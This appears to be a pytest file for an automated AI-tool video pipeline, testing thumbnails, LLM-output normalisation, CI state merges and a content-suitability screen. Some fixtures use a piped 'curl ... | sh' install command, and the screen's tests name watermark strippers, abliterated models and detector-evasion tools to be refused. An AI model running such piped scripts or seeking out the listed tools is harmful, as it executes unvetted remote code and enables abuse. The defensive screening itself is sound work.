    """A hook too long for two measured lines is marked as cut, not truncated
    invisibly — the viewer can see the sentence did not end there."""
    from factverse import shorts as sh
    from factverse import branding as br
    lines, _ = sh._wrap_hook(" ".join(["extraordinarily"] * 12), sh._overlay_font)
    assert len(lines) == 2 and lines[-1].endswith("…")


def test_normalize_moments_survives_raw_llm_shapes():
    """eng.find_best_moments ends in `return d["moments"]` on raw Gemini JSON and
    make_shorts indexed it directly: "scene_num": "4" raised TypeError inside
    min(), "hook_text": null raised AttributeError on .split(), and a dict-shaped
    "moments" raised on the slice — unwinding past the finished video, the
    thumbnail and EVERY record_run call, so the render died with no ledger row.
    Same class as the C.1 `tags` comma-string; same treatment normalize_shorts_meta
    already gives the sibling call."""
    from factverse import shorts as sh
    ok = sh.normalize_moments([{"scene_num": "4", "hook_text": "a real hook"}], 12)
    assert ok == [{"scene_num": 4, "hook_text": "a real hook"}]
    assert sh.normalize_moments({"scene_num": 4}, 12) == []          # dict, not list
    assert sh.normalize_moments("moments", 12) == []
    assert sh.normalize_moments(None, 12) == []
    assert sh.normalize_moments([3, "x", None], 12) == []            # bare entries
    # an unusable scene_num falls back to the module's long-standing default of 3
    assert sh.normalize_moments([{"scene_num": None, "hook_text": "h"}], 12) == \
        [{"scene_num": 3, "hook_text": "h"}]
    assert sh.normalize_moments([{"scene_num": 99, "hook_text": "h"}], 12)[0]["scene_num"] == 12
    assert sh.normalize_moments([{"scene_num": 4, "hook_text": 54}], 12)[0]["hook_text"] == "54"
    assert sh.normalize_moments([{"scene_num": 4, "hook_text": "  "}], 12) == []


def test_make_shorts_returns_empty_instead_of_raising_on_bad_moments(monkeypatch):
    """The raise happened after the long-form video and thumbnail were rendered
    and before anything was uploaded — no ledger row of any status was written."""
    from factverse import shorts as sh
    monkeypatch.setattr(sh.eng, "dur", lambda v: 300.0)
    monkeypatch.setattr(sh.eng, "find_best_moments", lambda s: {"scene_num": "4"})
    script = {"scenes": [{"narration": f"s{i}"} for i in range(12)]}
    assert sh.make_shorts("v.mp4", script, [], max_count=2) == []


# --------------------------------------------------------------- thumbnail
def test_thumbnail_headline_is_measured_against_the_frame():
    """Both older composers picked a size off a CHARACTER-count ladder and drew
    it at x=54/56 with no measurement. "OPENAI QUIETLY SHIPPED A NEW REASONING
    MODEL" measures 1296px at the ladder's own floor of 92px — 72px off a 1280px
    frame. make_tool_thumb, written later for v3, already measured; the two
    older composers never got it."""
    from PIL import Image, ImageDraw
    from factverse import thumbnail as th
    d = ImageDraw.Draw(Image.new("RGB", (th.W, th.H)))
    for text in ("OPENAI QUIETLY SHIPPED A NEW REASONING MODEL",
                 "AI JUST CHANGED EVERYTHING", "FREE", "GPT-5 BENCHMARKS LEAKED"):
        lines = th._wrap_two(text)
        size, font = th._headline_font(lines, th.X_EDGE)
        assert max(d.textlength(l, font=font) for l in lines) <= th.W - 2 * th.X_EDGE, \
            f"{text!r} overflows at size {size}"


def test_thumbnail_falls_back_to_the_title_when_thumb_text_is_empty(monkeypatch):
    """thumb_text is optional — _validate_script does not require it — and
    _wrap_two("") returns [], so both composers skipped the headline block and
    still SAVED and returned the image: a graded photo with no text on it. The
    confidence router's packaging term scored the missing thumb_text at 0.7 and
    never learned the thumbnail came out blank."""
    from factverse import thumbnail as th
    assert th._headline("", "OpenAI Ships A New Model") == "OpenAI Ships A New Model"
    assert th._headline("   ", "OpenAI Ships A New Model") == "OpenAI Ships A New Model"
    assert th._headline("REAL HOOK", "the title") == "REAL HOOK"
    assert th._headline("", "") == ""


def test_tool_thumb_whitespace_text_still_gets_words():
    """`thumb_text or "FREE AI TOOL"` never fired for a whitespace string — a
    whitespace value is truthy, so .split()[:4] produced [] and the tool
    thumbnail published with no overlay at all."""
    from factverse import thumbnail as th
    assert th._headline("   ", "") == ""
    words = " ".join((th._headline("   ", "") or "FREE AI TOOL").split()[:4])
    assert words == "FREE AI TOOL"


# --------------------------------------------------------------- l2 + run state
def test_failed_splice_does_not_consume_or_record_the_human_clip(monkeypatch, tmp_path):
    """splice() returned the same `video` string on success and on failure, so
    inject() could not tell them apart: a failed splice still consumed the clip
    PERMANENTLY (each is usable at most once) and still wrote it into the run
    record as evidence of human insight — which also satisfies the
    require_insight_block O1 gate, the one gate whose whole job is to refuse to
    publish without a human take."""
    from factverse import l2
    marked = []
    monkeypatch.setattr(l2, "next_clip",
                        lambda kind: tmp_path / ("c.mp3" if kind == "cold_open" else "i.mp3"))
    monkeypatch.setattr(l2, "build_human_segment", lambda w, o, label="": str(o))
    monkeypatch.setattr(l2, "splice", lambda v, s, at: None)          # every splice fails
    monkeypatch.setattr(l2, "_mark_used", lambda k, n: marked.append((k, n)))
    monkeypatch.setattr(l2, "_dur", lambda p: 20.0)
    video, rec = l2.inject("v.mp4", 100.0)
    assert video == "v.mp4"                       # the untouched video is still returned
    assert rec == {"cold_open": None, "insight": None}, rec
    assert marked == [], "a failed splice burned a one-use clip"


def test_successful_splice_consumes_and_records_the_clip(monkeypatch, tmp_path):
    from factverse import l2
    marked = []
    monkeypatch.setattr(l2, "next_clip",
                        lambda kind: tmp_path / ("c.mp3" if kind == "cold_open" else "i.mp3"))
    monkeypatch.setattr(l2, "build_human_segment", lambda w, o, label="": str(o))
    monkeypatch.setattr(l2, "splice", lambda v, s, at: v)
    monkeypatch.setattr(l2, "_mark_used", lambda k, n: marked.append((k, n)))
    monkeypatch.setattr(l2, "_dur", lambda p: 20.0)
    _, rec = l2.inject("v.mp4", 100.0)
    assert rec == {"cold_open": "c.mp3", "insight": "i.mp3"}
    assert marked == [("cold_open", "c.mp3"), ("insight", "i.mp3")]


def test_every_state_file_the_run_writes_survives_the_ci_state_save():
    """The CI state-save stashes a list of files, then `git checkout -B main
    origin/main` throws the run's branch away. A tracked state file that is in
    neither the stash list nor state_merge.FILES is silently reverted on EVERY
    run — for l2_usage.json that means "each clip used at most once" is
    unenforceable in CI and the same human cold open would be injected into
    every video."""
    from factverse import state_merge
    root = Path(__file__).resolve().parent.parent
    wf = (root / ".github" / "workflows" / "publish.yml").read_text(encoding="utf-8")
    for name in ("state/l2_usage.json", "state/stock_ledger.json"):
        assert name in state_merge.FILES, f"{name} is not union-merged"
        assert name in wf, f"{name} is not stashed before the checkout"
    # everything state_merge knows how to merge must also be stashed, or the
    # merge runs against origin/main's copy of a file the run already replaced
    for name in state_merge.FILES:
        assert name in wf, f"{name} is merged but never stashed"


def test_l2_usage_and_stock_ledger_merge_by_their_own_shapes():
    """Both are dicts, and merge_file's fallback is an ordered LIST union — so
    simply adding them to FILES would have raised TypeError inside the CI
    state-save step and lost every state file, not just these two."""
    import json as _json
    from factverse import state_merge as sm
    used = sm.merge_file("state/l2_usage.json",
                         '{"cold_open": ["a.mp3"], "insight": ["i1.mp3"]}',
                         '{"cold_open": ["b.mp3", "a.mp3"]}')
    assert _json.loads(used) == {"cold_open": ["b.mp3", "a.mp3"], "insight": ["i1.mp3"]}
    led = sm.merge_file("state/stock_ledger.json",
                        '{"1": "2026-08-20T10:00:00", "2": "2026-08-24T10:00:00"}',
                        '{"1": "2026-08-22T10:00:00", "3": "2026-08-23T10:00:00"}')
    assert _json.loads(led) == {"1": "2026-08-22T10:00:00",     # later sighting wins
                                "2": "2026-08-24T10:00:00",     # ours only
                                "3": "2026-08-23T10:00:00"}     # theirs only


# --------------------------------------------------------------- step5_build
def test_scene_keeps_its_full_duration_when_a_clip_fails_to_encode():
    """The multi-clip branch discarded safe_run's return and appended only the
    subs that landed, then concatenated whatever survived. One failed clip left
    the scene short by its whole share — and because the audio is the master
    track and every later scene simply follows, the REST of the video slid
    earlier against the narration. Multi-clip scenes are the default
    (dl_clips(count=2))."""
    import importlib
    eng = importlib.import_module("factverse_engine")
    # 3 clips over a 30s scene = 10s each; if one fails the survivors take 15s
    assert eng.sub_durations(30.0, 3, 3) == [10.0, 10.0, 10.0]
    assert eng.sub_durations(30.0, 3, 2) == [15.0, 15.0]
    assert eng.sub_durations(30.0, 3, 1) == [30.0]
    assert eng.sub_durations(30.0, 3, 0) == []
    # the scene's total is always preserved
    for survived in (1, 2, 3):
        assert abs(sum(eng.sub_durations(30.0, 3, survived)) - 30.0) < 1e-9


# ------------------------------------------- v3-C.4: suitability screen precision
def test_prose_words_do_not_reject_a_readme():
    """Measured 2026-08-24 over 28 flagship AI tools: 'bypass' and 'crack' are ordinary
    documentation words. unsloth's own Windows install line is
    `set-executionpolicy -scope process -executionpolicy bypass`, ComfyUI binds ctrl+b to
    'bypass selected nodes', and transformers ships a 'wise-cracking robot' example prompt.
    All three were refused. A word that only means something when it NAMES the tool must
    screen the title, not 5,000 chars of prose."""
    from factverse import gates
    unsloth = (r"git clone unsloth && cd unsloth && set-executionpolicy -scope process "
               r"-executionpolicy bypass .\install.ps1 --local. " * 20)
    assert not gates.tool_unsuitable("unslothai/unsloth: finetune LLMs 2x faster", unsloth)[0]
    comfy = "Keybindings: ctrl + b bypass selected nodes, ctrl + m mute selected nodes. " * 20
    assert not gates.tool_unsuitable("comfyanonymous/ComfyUI: node-based diffusion UI", comfy)[0]
    hf = "chat = [{'role': 'system', 'content': 'you are a sassy, wise-cracking robot'}]. " * 20
    assert not gates.tool_unsuitable("huggingface/transformers", hf)[0]
    # ...but a tool NAMED for the act is still refused on the title alone
    assert gates.tool_unsuitable("GPTBypass: bypass any AI detector in one click")[0]
    assert gates.tool_unsuitable("cracked-ai: keygen for paid AI apps")[0]


def test_a_detector_is_not_blocked_by_its_own_subject():
    """Measured 2026-08-24: 6 of 11 defensive tools were refused by the subject they defend
    against — including the official C2PA SDK and CLI (the term was added to block provenance
    STRIPPERS and it blocked the STANDARD), two deepfake DETECTORS and two NSFW classifiers.
    A 'how to detect this' video is the utility lane's best content, not its worst."""
    from factverse import gates
    nsfw = ("NSFW detection machine learning model trained on 60+ gigs of data. "
            "Keras model of NSFW detector. " * 20)
    assert not gates.tool_unsuitable("GantMan/nsfw_model: Keras model of NSFW detector", nsfw)[0]
    dfdc = "Deepfake detection (DFDC) solution. Face forgery detection articles. " * 20
    assert not gates.tool_unsuitable("selimsef/dfdc_deepfake_challenge", dfdc)[0]
    c2pa = ("Rust SDK for the core C2PA (Coalition for Content Provenance and Authenticity) "
            "specification. Command line tool for displaying and adding C2PA manifests. " * 20)
    assert not gates.tool_unsuitable("contentauth/c2pa-rs: Rust SDK for C2PA", c2pa)[0]

    # the control: a stripper names the very same standards and is still refused
    stripper = ("Agent skill + stdlib python service that strips multi-vendor AI provenance "
                "marks from text and files. Clears C2PA plus metadata, covers class-level "
                "marks from gemini/synthid-text. " * 20)
    assert gates.tool_unsuitable("ShadowAqueduct/watermark-remover", stripper)[0]
    # 'undetectable' and 'anti-detection' are evasion claims, never a detector
    assert gates.tool_unsuitable("x/y", "Undetectable deepfake generator. " * 40)[0]
    assert gates.tool_unsuitable("x/y", "Deepfake video with anti-detection technology. " * 40)[0]


def test_the_live_stripper_is_caught_on_its_own_name():
    """Measured 2026-08-24: 'ShadowAqueduct/watermark-remover: Purge multi-vendor AI
    watermarks' PASSED the title screen. The list held 'watermark remov' (space) and
    'watermarks-remover' (plural); the repo is 'watermark-remover'. It reached script_tool
    and was rejected only because its README quotes the OTHER repo's name in ASCII art."""
    from factverse import gates
    for title in [
        "ShadowAqueduct/watermark-remover: Purge multi-vendor AI watermarks",
        "unwatermark.ai — remove any watermark in one click",
        "XTTS: instant voice cloning from 6 seconds of audio",
        "nudify studio", "DeepNude AI",
        "Qwen3-27B-abliterated", "OBLITERATUS/Qwen3.8-27B-OBLITERATED — trending",
        "AI Humanizer: make GPT text read as human",
    ]:
        assert gates.tool_unsuitable(title)[0], f"passed the title screen: {title}"
    # the C.1 acceptance criterion still holds — these must stay teachable
    for ok in ["unsloth/Qwen3.8-27B-GGUF — trending model",
               "MarkItDown converts Office files to Markdown",
               "Qwen/Qwen3.8-27B — trending image text to text on Hugging Face"]:
        assert not gates.tool_unsuitable(ok)[0], f"wrongly refused: {ok}"


def test_github_candidates_ground_in_the_raw_readme():
    """Measured 2026-08-24: fetch_text on a github.com page returns a mean 1,637 chars of
    GitHub chrome ('You signed in with another tab or window', the file listing) before the
    README starts, so only ~3,360 chars of README are ever read — and that chrome is handed
    to the LLM as 'SOURCE EXCERPT (ground every claim in this)' and to gates.fact_check.
    Hugging Face was given the raw card in C.1 decision 2; GitHub never was."""
    assert (ap._gh_readme_url("https://github.com/org/repo")
            == "https://raw.githubusercontent.com/org/repo/HEAD/README.md")
    assert (ap._gh_readme_url("https://github.com/org/repo/")
            == "https://raw.githubusercontent.com/org/repo/HEAD/README.md")
    assert ap._gh_readme_url("https://huggingface.co/org/model") == ""
    assert ap._gh_readme_url("https://github.com/org") == ""          # an owner, not a repo
    assert ap._gh_readme_url("https://github.com/org/repo/issues/3") == ""


def test_script_tool_falls_back_to_the_page_when_the_raw_readme_is_missing(monkeypatch):
    """Unlike Hugging Face (C.1 decision 2), the GitHub fallback is kept: the hub's fallback
    was a Jinja template that reads as real, while GitHub's is merely chrome-padded — the
    behaviour shipping today. A repo whose readme is .rst or lowercase must still work."""
    seen = []

    def fake_fetch(u, limit=4000):
        seen.append(u)
        return "" if "raw.githubusercontent.com" in u else "genuine readme prose. " * 300

    monkeypatch.setattr(ap, "fetch_text", fake_fetch)
    monkeypatch.setattr(ap.llm, "generate_json", lambda *a, **k: {})
    monkeypatch.setattr(ap, "_validate_script", lambda *a, **k: None)
    ap.script_tool({"title": "o/r", "source": "github", "url": "https://github.com/o/r"})
    assert seen[0] == "https://raw.githubusercontent.com/o/r/HEAD/README.md"
    assert seen[1] == "https://github.com/o/r", "a missing raw README must fall back to the page"


# ------------------------------------------------- v3-E: receipts + packaging precision
class _FakeResp:
    def __init__(self, code=200, body=None):
        self.status_code = code
        self._body = body or {}
        self.headers = {"content-type": "application/json"}
    def json(self):
        return self._body


def test_verified_facts_reach_the_writer_and_survive_rewrites(monkeypatch):
    """v3-E #1: sources.py fetches stars and throws them away; the prompt demands
    'stars, size, price' with no numbers to satisfy it. Measured: the last two live
    scripts carried ~0.1-0.25 digit-tokens per 100 words and plan_cards returned []."""
    def fake_get(url, **kw):
        if "api.github.com/repos/" in url:
            return _FakeResp(200, {"stargazers_count": 12345,
                                   "license": {"spdx_id": "MIT"},
                                   "pushed_at": "2026-08-20T00:00:00Z",
                                   "open_issues_count": 42})
        raise AssertionError("unexpected GET " + url)
    monkeypatch.setattr(ap.requests, "get", fake_get)
    facts = ap._verified_facts("https://github.com/org/repo")
    assert facts["stars"] == 12345 and facts["license"] == "MIT"

    # the fetch NEVER raises the day away
    def boom(*a, **k):
        raise RuntimeError("net down")
    monkeypatch.setattr(ap.requests, "get", boom)
    assert ap._verified_facts("https://github.com/org/repo") == {}
    assert ap._verified_facts("https://example.com/x") == {}

    # the writer sees the numbers, the script carries them, the rewrite passes keep them
    prompts = []
    monkeypatch.setattr(ap, "fetch_text",
                        lambda u, limit=4000: "install: ```\npip install repo\n``` prose. " * 40)
    monkeypatch.setattr(ap, "_verified_facts", lambda u: {"stars": 12345, "license": "MIT"})
    monkeypatch.setattr(ap, "_top_issues", lambda u: [])
    monkeypatch.setattr(ap.llm, "generate_json", lambda p, **k: prompts.append(p) or None)
    ap.script_tool({"title": "org/repo: helpful", "source": "gh",
                    "url": "https://github.com/org/repo"})
    assert "VERIFIED FACTS" in prompts[0] and "12345" in prompts[0].replace(",", "")
    assert "verified_facts" in ap._CARRY, \
        "a script-level key not in _CARRY is DROPPED by every rewrite pass (the documented trap)"


def test_a_command_the_readme_never_shows_cannot_ship(monkeypatch):
    """v3-E #2: only prompt text enforces the copy-paste contract; a hallucinated flag
    lands on the code card, the description AND the PDF. Containment is pure."""
    g = "Install with:\n```\npip   install\n  ollama\n```\nthen run it."
    assert ap.command_grounded("pip install ollama", g)
    assert ap.command_grounded("pip install ollama • run it", g)
    assert not ap.command_grounded("pip install ollama --turbo-flag", g)

    # script_tool: an ungrounded deliverable is REPLACED by the readme's first fenced block
    monkeypatch.setattr(ap, "fetch_text",
                        lambda u, limit=4000: ("intro prose. ```\ncurl -fsSL https://x.sh | sh\n``` "
                                               "more prose. " * 30))
    monkeypatch.setattr(ap, "_verified_facts", lambda u: {})
    monkeypatch.setattr(ap, "_top_issues", lambda u: [])
    monkeypatch.setattr(ap.llm, "generate_json", lambda p, **k: {"x": 1})
    monkeypatch.setattr(ap, "_validate_script", lambda *a, **k: {
        "title": "T", "deliverable": {"kind": "command",
                                      "text": "curl -fsSL https://x.sh | sh --invented",
                                      "url": "https://github.com/o/r"}})
    s = ap.script_tool({"title": "o/r", "source": "gh", "url": "https://github.com/o/r"})
    assert s["deliverable"]["text"] == "curl -fsSL https://x.sh | sh"

    # ...and a readme with NO fenced command rejects the candidate like no-deliverable
    monkeypatch.setattr(ap, "fetch_text", lambda u, limit=4000: "prose only, no fences. " * 60)
    assert ap.script_tool({"title": "o/r", "source": "gh",
                           "url": "https://github.com/o/r"}) is None


def test_a_number_the_video_never_says_is_stripped_from_the_packaging():
    """v3-E #3: the 0821 run shipped 'Secret AI Cash Cow?' + 'AI $$ Backlash' + a
    'how much' hook over 17 scenes with ZERO dollar figures. fact_check only sees claims
    that EXIST — an absent promised number is invisible to every gate."""
    from factverse import gates
    ok = {"title": "Ollama hits 54% adoption in a year", "thumb_text": "54% FREE",
          "scenes": [{"narration": "adoption crossed 54 percent this year"}],
          "verified_facts": {}}
    r = gates.packaging_payoff(ok)
    assert r["ok"] and ok["thumb_text"] == "54% FREE"

    bad = {"title": "This tool is 97% faster than GPT", "thumb_text": "97% FASTER",
           "scenes": [{"narration": "it is very fast, no benchmark was given"}],
           "verified_facts": {}}
    r = gates.packaging_payoff(bad)
    assert not r["ok"] and r["fixed"]
    # digitless residue is mangled by definition — the review reproduced "K STARS"
    # burned on a thumbnail. Blank it; the composers' `or title` fallback takes over.
    assert bad["thumb_text"] == ""
    assert "97" not in bad["title"] and "GPT" in bad["title"]

    # the magnitude suffix strips WITH its number, and rounding is not support:
    # verified 179,234 does not license a thumb that claims 180K
    kres = {"title": "A fine tool for everyone", "thumb_text": "180K STARS",
            "scenes": [{"narration": "one hundred seventy nine thousand stars"}],
            "verified_facts": {"stars": 179234}}
    gates.packaging_payoff(kres)
    assert kres["thumb_text"] == "", f"residue survived: {kres['thumb_text']!r}"

    # token-exact support: a fabricated 10 must not ride on a 2010 in the text
    fab = {"title": "It makes you 10x faster today", "thumb_text": "FREE",
           "scenes": [{"narration": "released back in 2010, it is quick"}],
           "verified_facts": {}}
    r = gates.packaging_payoff(fab)
    assert not r["ok"] and "10" not in fab["title"]

    # digits glued into a product name are NOT packaging numbers
    gpt = {"title": "GPT-5.6 explained for builders", "thumb_text": "FREE",
           "scenes": [{"narration": "no digits spoken"}], "verified_facts": {}}
    assert gates.packaging_payoff(gpt)["ok"] and gpt["title"] == "GPT-5.6 explained for builders"

    # the hands-on template is tool-lane ONLY — a gutted news title stays stripped
    news_gut = {"title": "40% off", "thumb_text": "OK", "format": "news",
                "signal_title": "reuters.com: markets",
                "scenes": [{"narration": "no numbers"}], "verified_facts": {}}
    gates.packaging_payoff(news_gut)
    assert "How to use" not in news_gut["title"]

    # verified_facts count as support — the receipts ARE the source of packaging numbers
    vf = {"title": "179,314 stars: the free private AI", "thumb_text": "179,314 STARS. FREE.",
          "scenes": [{"narration": "the stars keep climbing"}],
          "verified_facts": {"stars": 179314}}
    r = gates.packaging_payoff(vf)
    assert r["ok"] and "179,314" in vf["thumb_text"]

    # stripping that guts the title falls back to the honest template
    gut = {"title": "40% off", "thumb_text": "OK", "format": "tool",
           "signal_title": "ollama/ollama: run models",
           "scenes": [{"narration": "no numbers here"}], "verified_facts": {}}
    gates.packaging_payoff(gut)
    assert gut["title"] == "How to use ollama (free)"


def test_the_limitation_scene_is_offered_real_issues(monkeypatch):
    """v3-E #4: the 'honest limitation' is currently invented from a vendor README that
    never admits limits. Top-commented open issues are the only permitted basis."""
    def fake_get(url, **kw):
        if "/issues" in url:
            return _FakeResp(200, [{"title": "OOM on 8GB machines"},
                                   {"title": "Slow first token on CPU"}])
        return _FakeResp(200, {"stargazers_count": 1})
    monkeypatch.setattr(ap.requests, "get", fake_get)
    issues = ap._top_issues("https://github.com/org/repo")
    assert issues == ["OOM on 8GB machines", "Slow first token on CPU"]

    # PRs are issues too in the GitHub API — they must not become "limitations"
    def pr_get(url, **kw):
        return _FakeResp(200, [{"title": "PR: add feature", "pull_request": {"url": "x"}},
                               {"title": "real bug"}])
    monkeypatch.setattr(ap.requests, "get", pr_get)
    assert ap._top_issues("https://github.com/org/repo") == ["real bug"]

    prompts = []
    monkeypatch.setattr(ap, "fetch_text",
                        lambda u, limit=4000: "x ```\npip install repo\n``` y. " * 40)
    monkeypatch.setattr(ap, "_verified_facts", lambda u: {})
    monkeypatch.setattr(ap, "_top_issues", lambda u: ["OOM on 8GB machines"])
    monkeypatch.setattr(ap.llm, "generate_json", lambda p, **k: prompts.append(p) or None)
    ap.script_tool({"title": "org/repo", "source": "gh", "url": "https://github.com/org/repo"})
    assert "OOM on 8GB machines" in prompts[0]


def test_thumb_contract_demands_a_declarative_number():
    """v3-E #5: both example strings in the old contract were hedge questions
    ('CHEAPER THAN GPT?'); HAL ships numeric declaratives ('-33%', 'THE FREE ONE')."""
    c = ap._output_contract("10-14", "50-70")
    line = c.split("thumb_text:")[1].split("\n-")[0]
    assert "?" not in line, "the thumb_text contract line must not model a question"
    assert "FREE" in line


def test_tool_chapters_need_no_llm(monkeypatch):
    """v3-E #6: the tool video's anatomy is fixed by its own prompt, so chapters are
    derivable — and the LLM version shipped 'Fragile Trust Broken' and auto-titlecased
    'Ai' on two live public descriptions."""
    def no_llm(*a, **k):
        raise AssertionError("tool_chapters must not call the LLM")
    monkeypatch.setattr(ap.llm, "generate_json", no_llm)
    script = {"format": "tool", "signal_title": "ollama/ollama: run models",
              "scenes": [
                  {"narration": "By the end you will run a private AI."},
                  {"narration": "The tool is Ollama, open source."},
                  {"narration": "Getting it is one install command in the terminal."},
                  {"narration": "Now the fun part, three things to make."},
                  {"narration": "More uses here."},
                  {"narration": "Honest limit: skip it if your machine is low on RAM."},
                  {"narration": "The exact command is in the description."}]}
    starts = [0.0, 11.0, 22.0, 33.0, 44.0, 55.0, 66.0]
    out = ap.tool_chapters(script, starts, 6.0)
    assert out.startswith("0:00 What ollama Does")
    assert "0:28 Install ollama" in out          # 22 + 6 shift
    assert "0:39 3 Things to Build" in out
    assert "1:01 Who Should Skip It" in out
    assert "1:12 The Exact Command" in out

    # a script without a recognisable install scene falls back (returns "")
    flat = {"format": "tool", "scenes": [{"narration": f"scene {i}"} for i in range(7)]}
    assert ap.tool_chapters(flat, starts, 0.0) == ""
    # a news script never takes this path
    script["format"] = "news"
    assert ap.tool_chapters(script, starts, 6.0) == ""


def test_pinned_comment_carries_the_command_on_tool_videos():
    """v3-E #7: the only API-writable engagement surface posted a news question under
    tool videos; the two things a tool viewer opens comments for are the command and
    the PDF."""
    tool = {"format": "tool",
            "deliverable": {"kind": "command", "text": "pip install ollama"},
            "cheat_sheet": "2026-08-24-x.pdf"}
    txt = ap.pinned_comment(tool)
    assert "pip install ollama" in txt
    assert site.public_url("2026-08-24-x.html") in txt
    news = {"format": "news"}
    assert "Sources are in the description" in ap.pinned_comment(news, "https://prev")
    assert "https://prev" in ap.pinned_comment(news, "https://prev")


def test_pdf_meta_line_renders_the_receipts():
    """v3-E #8: HAL's field guide stamps stars+license+date per item; ours renders the
    same line from verified_facts and disappears cleanly without them."""
    import datetime as _dt
    s = {"verified_facts": {"stars": 179314, "license": "MIT"}}
    line = deliverable.meta_line(s)
    assert "179,314 stars" in line and "MIT" in line
    assert "★" not in line, "JetBrainsMono has no star glyph — it renders as tofu"
    assert _dt.date.today().isoformat() in line
    assert deliverable.meta_line({}) == ""
    assert deliverable.meta_line({"verified_facts": {}}) == ""


def test_brand_assets_regenerate_when_the_brand_changes(tmp_path, monkeypatch):
    """v3-E #10: the sting/banner still sell v2 news ('AI NEWS, DECODED') while the
    default lane is tools — and a Studio rename must apply itself on the next run,
    not wait for someone to remember to delete assets/."""
    from factverse import branding, config as fv2
    calls = []
    monkeypatch.setattr(fv2, "ASSETS", tmp_path)
    monkeypatch.setattr(branding, "make_intro", lambda p: calls.append("intro"))
    monkeypatch.setattr(branding, "make_outro", lambda p: calls.append("outro"))
    monkeypatch.setattr(branding, "bumper_ok", lambda p: True)

    branding.ensure_assets()                      # no stamp yet -> regen
    assert calls == ["intro", "outro"]
    branding.ensure_assets()                      # stamp matches -> no regen
    assert calls == ["intro", "outro"]
    monkeypatch.setattr(fv2, "CHANNEL_NAME", "ToolDojo-Renamed")
    branding.ensure_assets()                      # brand changed -> regen
    assert calls == ["intro", "outro", "intro", "outro"]


def test_elevenlabs_seam_is_off_by_default_and_fails_soft(monkeypatch, tmp_path):
    """v3-E #11: the paid voice is a flag + key + voice id, all absent by default —
    merging it costs nothing. With a stubbed API it yields word timings; any failure
    must reach the kokoro/edge chain unchanged."""
    from factverse import tts_eleven
    monkeypatch.delenv("ELEVENLABS_API_KEY", raising=False)
    assert not tts_eleven.available()

    # character alignment -> word timings, pure
    words = tts_eleven._words_from_chars(
        list("hi you"), [0.0, 0.1, 0.2, 0.3, 0.4, 0.5],
        [0.1, 0.2, 0.3, 0.4, 0.5, 0.6])
    assert words == [(0.0, 0.2, "hi"), (0.3, 0.6, "you")]

    # synthesize_voice prefers the seam when available...
    monkeypatch.setattr(ap.tts_eleven, "available", lambda: True)
    monkeypatch.setattr(ap.tts_eleven, "synth",
                        lambda text, out: (str(tmp_path / "v.mp3"), [(0.0, 1.0, "hi")]))
    audio, words = ap.synthesize_voice("hi", {})
    assert audio.endswith("v.mp3") and words == [(0.0, 1.0, "hi")]

    # ...and ANY failure falls through to the existing chain
    monkeypatch.setattr(ap.tts_eleven, "synth", lambda text, out: None)
    monkeypatch.setattr(ap.tts_kokoro, "available", lambda: False)
    monkeypatch.setattr(ap.captions, "synth_with_words",
                        lambda *a, **k: [(0.0, 0.5, "edge")])
    audio, words = ap.synthesize_voice("hi", {})
    assert words == [(0.0, 0.5, "edge")]


def test_the_wordmark_follows_the_configured_name(monkeypatch):
    """v3-E #10/#12: the sting hardcoded AI+PULSE, so the ToolDojo rename would have
    shipped bumpers selling the old channel — the demo frame caught it."""
    from factverse import branding, config as fv2
    monkeypatch.setattr(fv2, "CHANNEL_NAME", "ToolDojo")
    assert branding._wordmark_parts() == ("TOOL", "DOJO")
    monkeypatch.setattr(fv2, "CHANNEL_NAME", "AI Pulse")
    assert branding._wordmark_parts() == ("AI", "PULSE")
    monkeypatch.setattr(fv2, "CHANNEL_NAME", "Zenith")
    assert branding._wordmark_parts() == ("ZENITH", "")


def test_review_fixes_stay_fixed(monkeypatch, tmp_path):
    """The four remaining confirmed findings from the v3-E adversarial review,
    each pinned so the fix cannot silently regress."""
    # 1. A dialogue script never reaches the single-voice paid seam — one voice
    #    interviewing itself is worse than two free voices.
    calls = []
    monkeypatch.setattr(ap.tts_eleven, "available", lambda: True)
    monkeypatch.setattr(ap.tts_eleven, "synth",
                        lambda text, out: calls.append("eleven") or ("v.mp3", [(0, 1, "x")]))
    monkeypatch.setattr(ap.tts_kokoro, "available", lambda: False)
    monkeypatch.setattr(ap.captions, "synth_with_words", lambda *a, **k: [(0.0, 0.5, "edge")])
    dialogue = {"scenes": [{"narration": "hello there", "speaker": "a"},
                           {"narration": "hi back", "speaker": "b"}]}
    ap.synthesize_voice("hello there . . . hi back", dialogue)
    assert calls == [], "a two-speaker script must fall through to the free multi-voice chain"

    # 2. The " . . . " scene separators must not become punctuation-only "words" —
    #    captions and scene sync were never built to receive one.
    from factverse import tts_eleven
    span = list("hi . . . yo")
    n = len(span)
    words = tts_eleven._words_from_chars(span, [i * 0.1 for i in range(n)],
                                         [i * 0.1 + 0.1 for i in range(n)])
    assert [w for _, _, w in words] == ["hi", "yo"]

    # 3. fetch_text preserves newlines so the fenced-block repair CAN fire — the
    #    review proved the old collapse made _first_fenced dead in production.
    class _R:
        status_code = 200
        headers = {"content-type": "text/plain"}
        text = ("Intro   prose here.\n\n```shell\ncurl -fsSL https://x.sh | sh\n```\n"
                + "More prose follows. " * 30)
    monkeypatch.setattr(ap.requests, "get", lambda *a, **k: _R())
    g = ap.fetch_text("https://raw.example/readme.md")
    assert ap._first_fenced(g) == "curl -fsSL https://x.sh | sh"
    assert "  " not in g, "runs of spaces must still collapse"

    # 4. build_pdf DRAWS the receipts line (the a25ae56 wiring bug): spy on the
    #    canvas seam, since the TTF encodes glyph ids and CI has no PDF-text lib.
    from reportlab.pdfgen.canvas import Canvas
    drawn, orig = [], Canvas.drawString
    monkeypatch.setattr(Canvas, "drawString",
                        lambda self, x, y, t, **kw: orig(self, x, y, drawn.append(t) or t, **kw))
    s = {"title": "T", "verified_facts": {"stars": 179314, "license": "MIT"},
         "deliverable": {"kind": "command", "text": "x", "url": "u"}}
    assert deliverable.build_pdf(s, {"what": "w", "steps": ["s"], "uses": [], "skip_if": ""},
                                 str(tmp_path / "m.pdf"))
    assert any("179,314 stars" in str(t) for t in drawn), \
        "meta_line built but never drawn (the a25ae56 regression)"


# ------------------------------------------------- v3-E.2: receipts (docs/spec/ai-pulse-v3e2.md)
def test_check_plan_downloads_and_never_executes():
    """The security line: a pip sdist download runs setup.py, a wheel download runs
    nothing — so pip is pinned to wheels; clone is shallow; a piped-sh, docker or
    URL-install segment (all of which would execute candidate code, or measure a
    10KB script and call it 'the download') is refused. Pure — no network."""
    from factverse import receipts as rc
    p = rc.check_plan("pip install unsloth", "D")
    assert p["kind"] == "pip" and p["target"] == "unsloth" and p["dest"] == "D"
